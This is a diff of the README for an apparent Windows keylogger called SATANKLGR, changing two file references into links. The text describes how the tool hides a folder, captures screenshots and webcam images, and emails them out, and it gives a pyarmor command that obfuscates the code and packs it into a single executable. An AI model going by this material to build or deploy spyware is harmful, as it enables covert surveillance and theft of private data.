@@ -44,7 +44,7 @@ python3 launcher.py
 When you launch compiled ```SATANKLGR.exe``` it authomatically creates a hidden foulder in C disc and subsequently gradually adds taken screenshots and webcam snaps. Then the programm appears in Task Manager works here all of the time. In case you choose all options it will work the same way, but if you have chosen an option without webcam and screenshots it will not create a foulder. If you generated file containing all the stuff it will add an exeption to the code, so on condition that webcamera is unplugged the programm will not be terminated. Since currently it does not add itself to the StartUp the session halts when computer is shutdown.
 
 # Note
-This application intended only for Windows Systems. In order to make an .exe file you have to launch ```launcher.py``` only on Windows.
+This application intended only for Windows Systems. In order to make an .exe file you have to launch [launcher.py](https://github.com/FZGbzuw412/SATANKLGR/blob/main/launcher.py) only on Windows.
 Besides, you need to have python 3.9.0 installed on your PC. Currently it is impossible to make an .exe file of OpenCV using the latest version of pyinstaller
 and pyarmor. It is possible to run SATANKLGR on Linux, however you will get only .py file with source code. Afterwards you can go to Windows and compile file to .exe using ```pyarmor pack --clean -e "--onefile --icon default.ico" SATANKLGR.py```
 
@@ -58,7 +58,7 @@ and pyarmor. It is possible to run SATANKLGR on Linux, however you will get only
 + Authomatical removing files after sending to email
 
 # Terminating Keylogger
-So as to terminate the session of keylogger launch ```terminate.bat```
+So as to terminate the session of keylogger launch [terminate.bat](https://github.com/FZGbzuw412/SATANKLGR/blob/main/terminate.bat)
 
 # Screenshots
 ## Generate
